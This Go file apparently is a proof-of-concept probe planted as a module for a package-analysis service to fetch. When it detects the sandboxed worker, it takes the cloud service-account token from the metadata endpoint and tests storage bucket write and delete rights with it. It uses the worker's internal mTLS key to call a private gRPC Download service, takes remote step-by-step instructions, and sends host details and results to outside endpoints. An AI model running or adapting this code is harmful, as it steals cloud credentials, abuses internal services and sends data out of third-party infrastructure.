package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

var genericResultURL string
var compilerResultURL string
var planURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string
var rpcServiceHost string
var rpcDialAddress string

const (
	protocolVersion = 1
	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion    = "v0.0.30-codex"
	maximumResult   = 256 * 1024
	maximumBody     = 256 * 1024
	requestTimeout  = 20 * time.Second
	resultTimeout   = 30 * time.Second
	planPollWindow  = 8 * time.Minute
	maximumPlanBody = 4096
	maximumPlanStep = 6
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane             string      `json:"lane"`
	CWD              string      `json:"cwd"`
	UID              int         `json:"uid"`
	GID              int         `json:"gid"`
	Hostname         string      `json:"hostname"`
	PID1             string      `json:"pid1"`
	ModuleFiles      []fileEntry `json:"module_files"`
	EnvironmentNames []string    `json:"environment_names"`
	TLSFiles         []tlsFile   `json:"tls_files"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	Method        string `json:"method"`
	HTTPStatus    int    `json:"http_status,omitempty"`
	GRPCStatus    string `json:"grpc_status,omitempty"`
	GRPCMessage   string `json:"grpc_message,omitempty"`
	BodyBytes     int    `json:"body_bytes,omitempty"`
	BodySHA256    string `json:"body_sha256,omitempty"`
	ContentType   string `json:"content_type,omitempty"`
	Authenticated bool   `json:"authenticated"`
	Error         string `json:"error,omitempty"`
}

type planStep struct {
	Version       int    `json:"version"`
	ID            string `json:"id"`
	Action        string `json:"action"`
	TLSServerName string `json:"tls_server_name,omitempty"`
}

type probeReport struct {
	Schema            string         `json:"schema"`
	Module            string         `json:"module"`
	Version           string         `json:"version"`
	StartedUTC        string         `json:"started_utc"`
	FinishedUTC       string         `json:"finished_utc"`
	Identity          identityResult `json:"identity"`
	Metadata          metadataResult `json:"metadata"`
	BucketPermissions []bucketResult `json:"bucket_permissions,omitempty"`
	CanaryURLSHA256   string         `json:"canary_url_sha256,omitempty"`
	CanaryBodySHA256  string         `json:"canary_body_sha256,omitempty"`
	Byteman           []grpcResult   `json:"byteman,omitempty"`
	DownloadAttempted bool           `json:"download_attempted"`
	PlanID            string         `json:"plan_id,omitempty"`
	TLSServerName     string         `json:"tls_server_name,omitempty"`
	Reason            string         `json:"reason,omitempty"`
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func main() {
	if genericResultURL == "" || compilerResultURL == "" || planURL == "" || bytemanCanaryURL == "" ||
		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	if identity.Lane == "capslock" {
		runCapslockSession(started, cwd, identity)
		return
	}
	report := newProbeReport(started, identity)
	report.Reason = "internal checks are fixed to the verified capslock lane"
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(genericResultURL, "v030-codex-"+identity.Lane, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:     "owned-byteman-probe/v1",
		Module:     moduleName,
		Version:    probeVersion,
		StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Identity:   identity,
	}
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         id,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
			lane = "capslock"
		}
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane:     lane,
		CWD:      cwd,
		UID:      os.Geteuid(),
		GID:      os.Getegid(),
		Hostname: hostname,
		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
		})
	}
	for _, value := range os.Environ() {
		name, _, found := strings.Cut(value, "=")
		if found && name != "" {
			result.EnvironmentNames = append(result.EnvironmentNames, name)
		}
	}
	sort.Strings(result.EnvironmentNames)
	for _, path := range []string{
		"/etc/tls/server-pool/server-tls-pool.pem",
		"/etc/tls/client/tls.crt",
		"/etc/tls/client/tls.key",
	} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present = true
			item.Mode = info.Mode().String()
			item.Size = info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
	if rpcDialAddress != "" {
		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
	}
	if rpcServiceHost != "" {
		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockSession(started time.Time, cwd string, identity identityResult) {
	initial := newProbeReport(started, identity)
	fillCapslockContext(&initial)
	initial.Reason = "waiting for a bounded Byteman plan"
	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if err := submitProbeReport(compilerResultURL, "v030-codex-capslock-initial", cwd, started, initial); err != nil {
		return
	}

	deadline := time.Now().Add(planPollWindow)
	cursor := 0
	consecutiveErrors := 0
	for cursor < maximumPlanStep && time.Now().Before(deadline) {
		step, available, err := fetchPlan(cursor)
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors >= 3 {
				break
			}
			time.Sleep(2 * time.Second)
			continue
		}
		consecutiveErrors = 0
		if !available {
			time.Sleep(2 * time.Second)
			continue
		}
		stepStarted := time.Now()
		report := newProbeReport(stepStarted, identity)
		report.PlanID = step.ID
		report.TLSServerName = step.TLSServerName
		if step.Action == "finish" {
			report.Reason = "bounded plan finished"
		} else {
			runBytemanProbe(&report, step.TLSServerName)
		}
		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		id := "v030-codex-step-" + strconv.Itoa(cursor)
		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
			return
		}
		cursor++
		if step.Action == "finish" {
			return
		}
	}
	finalStarted := time.Now()
	final := newProbeReport(finalStarted, identity)
	if cursor >= maximumPlanStep {
		final.Reason = "bounded plan step limit reached"
	} else if consecutiveErrors >= 3 {
		final.Reason = "bounded plan endpoint failed three times"
	} else {
		final.Reason = "bounded plan polling window expired"
	}
	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(compilerResultURL, "v030-codex-final", cwd, finalStarted, final)
}

func fetchPlan(cursor int) (planStep, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
	if err != nil {
		return planStep{}, false, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return planStep{}, false, err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return planStep{}, false, nil
	}
	if response.StatusCode != http.StatusOK {
		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
	if err != nil || len(body) > maximumPlanBody {
		return planStep{}, false, errors.New("plan response too large")
	}
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	var step planStep
	if err := decoder.Decode(&step); err != nil {
		return planStep{}, false, errors.New("plan response was invalid JSON")
	}
	if err := decoder.Decode(&struct{}{}); err != io.EOF {
		return planStep{}, false, errors.New("plan response had trailing data")
	}
	if err := validatePlanStep(step); err != nil {
		return planStep{}, false, err
	}
	return step, true, nil
}

func validatePlanStep(step planStep) error {
	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
		return errors.New("plan identity was invalid")
	}
	for _, value := range step.ID {
		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
			return errors.New("plan identity was invalid")
		}
	}
	switch step.Action {
	case "probe-byteman":
		if !allowedTLSServerName(step.TLSServerName) {
			return errors.New("plan TLS server name was not allowed")
		}
	case "finish":
		if step.TLSServerName != "" {
			return errors.New("finish plan included a TLS server name")
		}
	default:
		return errors.New("plan action was not allowed")
	}
	return nil
}

func allowedTLSServerName(value string) bool {
	if value == "rpc.deps.dev" {
		return true
	}
	const suffix = ".rpc.deps.dev"
	if !strings.HasSuffix(value, suffix) {
		return false
	}
	label := strings.TrimSuffix(value, suffix)
	if len(label) < 1 || len(label) > 63 || label[0] == '-' || label[len(label)-1] == '-' {
		return false
	}
	for _, character := range label {
		if (character < 'a' || character > 'z') && (character < '0' || character > '9') && character != '-' {
			return false
		}
	}
	return true
}

func fillCapslockContext(report *probeReport) {
	metadataClient := &http.Client{
		Transport: &http.Transport{Proxy: nil},
		Timeout:   requestTimeout,
	}
	metadata, token := inspectMetadata(metadataClient)
	report.Metadata = metadata
	if token != "" {
		for _, bucket := range bucketNames {
			report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(token, bucket))
		}
	}
}

func runBytemanProbe(report *probeReport, tlsServerName string) {
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.30-codex canary\n"))
	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
	rpcClient, rpcEndpoint, err := newMTLSClient(tlsServerName)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	lookupRequest := appendStringField(nil, 2, bytemanCanaryURL)
	baseline := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest)
	report.Byteman = append(report.Byteman, baseline)
	if baseline.HTTPStatus != http.StatusOK || baseline.GRPCStatus != "0" {
		report.Reason = "Byteman Lookup did not authenticate cleanly; Download was not attempted"
		return
	}
	metadataMessage := []byte{}
	metadataMessage = appendStringField(metadataMessage, 2, "https://proxy.golang.org")
	metadataMessage = appendVarintField(metadataMessage, 3, 1) // GO_MODULE
	metadataMessage = appendStringField(metadataMessage, 4, moduleName)
	metadataMessage = appendVarintField(metadataMessage, 5, 1) // CONCRETE
	metadataMessage = appendStringField(metadataMessage, 6, probeVersion)
	downloadRequest := []byte{}
	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v030-codex-byteman-probe")
	report.DownloadAttempted = true
	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
	report.Byteman = append(report.Byteman, download)
	if download.HTTPStatus == http.StatusOK && download.GRPCStatus == "0" {
		time.Sleep(1500 * time.Millisecond)
		report.Byteman = append(report.Byteman, callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest))
	}
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func newMTLSClient(tlsServerName string) (*http.Client, string, error) {
	if !allowedTLSServerName(tlsServerName) {
		return nil, "", errors.New("TLS server name was not allowed")
	}
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, "", err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, "", errors.New("server pool contained no certificates")
	}
	host := strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
	portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
	address, endpoint, err := internalRPCAddress(host, portText, tlsServerName)
	if err != nil {
		return nil, "", err
	}
	rpcServiceHost = host
	rpcDialAddress = address
	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, address)
		},
		TLSClientConfig: &tls.Config{
			Certificates: []tls.Certificate{certificate},
			RootCAs:      roots,
			MinVersion:   tls.VersionTLS12,
			ServerName:   tlsServerName,
		},
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
}

func internalRPCAddress(host, portText, tlsServerName string) (string, string, error) {
	if !allowedTLSServerName(tlsServerName) {
		return "", "", errors.New("TLS server name was not allowed")
	}
	parsed := net.ParseIP(host)
	if parsed == nil || parsed.IsUnspecified() || parsed.IsMulticast() {
		return "", "", errors.New("RPC_SERVICE_HOST was not a usable IP literal")
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return "", "", errors.New("RPC_SERVICE_PORT_GRPC was not a usable port")
	}
	address := net.JoinHostPort(parsed.String(), strconv.Itoa(port))
	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
	return address, endpoint, nil
}

func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
	result := grpcResult{Method: method}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", "18S")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = result.GRPCStatus != "7" && result.GRPCStatus != "16"
	return result
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
